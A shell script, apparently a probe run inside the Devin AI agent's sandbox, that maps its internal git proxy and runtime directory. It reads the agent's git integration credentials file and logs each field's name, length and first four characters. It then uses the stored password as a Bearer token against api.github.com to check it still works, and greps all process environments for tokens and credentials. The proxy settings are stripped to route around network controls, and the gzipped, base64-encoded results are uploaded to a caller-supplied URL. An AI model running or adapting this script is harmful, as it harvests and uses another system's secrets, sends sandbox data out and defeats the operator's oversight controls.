#!/bin/sh
# i73119 read-only probe: Devin in-sandbox git integration proxy (git-manager.local:7000)
# and /run/.devin runtime dir. All secrets masked before upload; plaintext never leaves sandbox.
U="$1"
W=/tmp/parity_gm; mkdir -p "$W" 2>/dev/null
R=$W/raw.txt; : >"$R"
export LC_ALL=C
hdr(){ printf '\n===== %s =====\n' "$*" >>"$R"; }
mask(){ sed -E -e 's/((Bearer|token|password|passwd|secret|api[_-]?key|Authorization)[^A-Za-z0-9]{0,3})[A-Za-z0-9._\/+=-]{10,}/\1<REDACTED>/Ig' -e 's/[A-Fa-f0-9]{40,}/<REDACTED_HEX>/g'; }

hdr WHOAMI; id >>"$R" 2>&1; hostname >>"$R" 2>&1; date -u >>"$R" 2>&1; uname -a >>"$R" 2>&1

hdr HOSTS_GETENT; getent hosts git-manager.local >>"$R" 2>&1; echo "rc=$?" >>"$R"
hdr HOSTS_GREP; grep -i git /etc/hosts >>"$R" 2>&1
hdr HOSTS_FULL; cat /etc/hosts >>"$R" 2>&1
hdr ROUTE; cat /proc/net/route >>"$R" 2>&1
hdr RESOLV; cat /etc/resolv.conf >>"$R" 2>&1

c(){ # label url
  L="$1"; URL="$2"
  hdr "CURL $L $URL"
  env -u http_proxy -u https_proxy -u HTTP_PROXY -u HTTPS_PROXY -u ALL_PROXY -u all_proxy \
    curl -sS --noproxy '*' --max-time 8 -D "$W/h" -o "$W/b" -w 'code=%{http_code} time=%{time_total} size=%{size_download}\n' "$URL" >>"$R" 2>&1
  echo "-- headers(head 12)" >>"$R"; head -12 "$W/h" 2>/dev/null | mask >>"$R"
  echo "-- body(head 400)" >>"$R"; head -c 400 "$W/b" 2>/dev/null | mask >>"$R"; printf '\n' >>"$R"
}

c ROOT_LOCAL http://git-manager.local:7000/
c HEALTH_LOCAL http://git-manager.local:7000/health
c PROXY_LOCAL http://git-manager.local:7000/proxy/
c INFOREFS_LOCAL "http://git-manager.local:7000/proxy/github.com/fw-ai/cookbook.git/info/refs?service=git-upload-pack"
c ROOT_IP http://172.16.255.1:7000/
c HEALTH_IP http://172.16.255.1:7000/health

g(){ # label repopath
  L="$1"; RP="$2"
  hdr "GIT_LSREMOTE $L $RP"
  timeout 25 git -c http.proxy= -c https.proxy= ls-remote "http://git-manager.local:7000/proxy/$RP" >"$W/g" 2>"$W/ge"
  echo "rc=$?" >>"$R"
  echo "refs_count=$(wc -l <"$W/g" 2>/dev/null | tr -d ' ')" >>"$R"
  echo "first_ref=$(head -1 "$W/g" 2>/dev/null | cut -c1-160 | mask)" >>"$R"
  echo "-- stderr(head 400)" >>"$R"; head -c 400 "$W/ge" 2>/dev/null | mask >>"$R"; printf '\n' >>"$R"
}

g COOKBOOK_PUBLIC github.com/fw-ai/cookbook.git
g FIRECTL_CANDIDATE github.com/fw-ai/firectl.git

hdr CREDS_FILE
F=/opt/.devin/.devin-integration-git-credentials
ls -la "$F" >>"$R" 2>&1
if [ -r "$F" ]; then
  echo "bytes=$(wc -c <"$F" | tr -d ' ') lines=$(wc -l <"$F" | tr -d ' ')" >>"$R"
  echo "-- field shape (values redacted)" >>"$R"
  sed -E 's/=.*/=<REDACTED>/' "$F" 2>/dev/null | head -c 300 >>"$R"; printf '\n' >>"$R"
  echo "-- field names + value length + 4char prefix" >>"$R"
  awk -F= '/^[A-Za-z_]+=/{printf "%s: len=%d prefix=%s...\n",$1,length($2),substr($2,1,4)}' "$F" 2>/dev/null | head -20 >>"$R"
  # masked head 400 for structural view
  echo "-- masked head 400" >>"$R"; head -c 400 "$F" 2>/dev/null | mask >>"$R"; printf '\n' >>"$R"
  # in-sandbox liveness check of a GitHub token (no token returned to collector)
  PW=$(awk -F= '/^password=/{print $2; exit}' "$F" 2>/dev/null)
  UN=$(awk -F= '/^username=/{print $2; exit}' "$F" 2>/dev/null)
  echo "username_prefix=$(printf %s "$UN" | cut -c1-4)... username_len=${#UN} password_len=${#PW}" >>"$R"
  if [ -n "$PW" ]; then
    hdr GITHUB_LIVENESS
    env -u http_proxy -u https_proxy -u HTTP_PROXY -u HTTPS_PROXY -u ALL_PROXY -u all_proxy \
      curl -sS --noproxy '*' --max-time 10 -o "$W/gh" -w 'code=%{http_code} time=%{time_total}\n' \
      -H "Authorization: Bearer $PW" -H 'Accept: application/vnd.github+json' -H 'User-Agent: i73119' \
      https://api.github.com/user >>"$R" 2>&1
    echo "-- body keys only (no values)" >>"$R"
    python3 - "$W/gh" >>"$R" 2>&1 <<'PY'
import json,sys
try:
    j=json.load(open(sys.argv[1]))
    print("keys:", sorted(j.keys())[:20] if isinstance(j,dict) else type(j).__name__)
    if isinstance(j,dict):
        print("login_type:", j.get("type"), "plan_present:", bool(j.get("plan")))
except Exception as e:
    print("parse_err", type(e).__name__)
PY
  fi
else
  echo "unreadable_or_missing" >>"$R"
fi

hdr RUN_DEVIN_LS
ls -la /run/.devin >>"$R" 2>&1
hdr RUN_DEVIN_STAT
stat /run/.devin >>"$R" 2>&1
hdr RUN_DEVIN_FIND
find /run/.devin -maxdepth 3 -type f -size -2M 2>/dev/null | head -50 >>"$R"
hdr RUN_DEVIN_GREP
for f in $(find /run/.devin -maxdepth 3 -type f -size -2M 2>/dev/null | head -30); do
  hits=$(grep -aiE '(authorization|bearer|token|credential|git-manager|proxy|brain|model)' "$f" 2>/dev/null | head -40 | cut -c1-240 | mask)
  [ -n "$hits" ] && { echo "--- $f"; printf '%s\n' "$hits"; }
done >>"$R" 2>&1

hdr PROCESS_GITENV
for p in /proc/[0-9]*; do
  tr '\0' '\n' < "$p/environ" 2>/dev/null | grep -aiE '(git-manager|GIT_|CREDENTIAL|PROXY)' | sed "s#^#$(basename "$p"):#" | mask
done | head -60 >>"$R" 2>&1

hdr ENDED
gzip -c "$R" 2>/dev/null | base64 -w0 >"$W/raw.b64" 2>/dev/null
SZ=$(wc -c <"$W/raw.b64" 2>/dev/null)
hdr "SIZE ${SZ:-0}"
{
  curl -fsS --max-time 90 -H 'content-type: text/plain' --data-binary @"$W/raw.b64" "$U" >/dev/null 2>&1 \
  || curl -sS --max-time 90 --data-binary @"$W/raw.b64" "$U" >/dev/null 2>&1
} || true
printf '{"ok":true,"size":%s,"nonce":"i73119"}\n' "${SZ:-0}" >"$W/result.json"
echo "runner provenance token: i73119-gm-probe-ok"
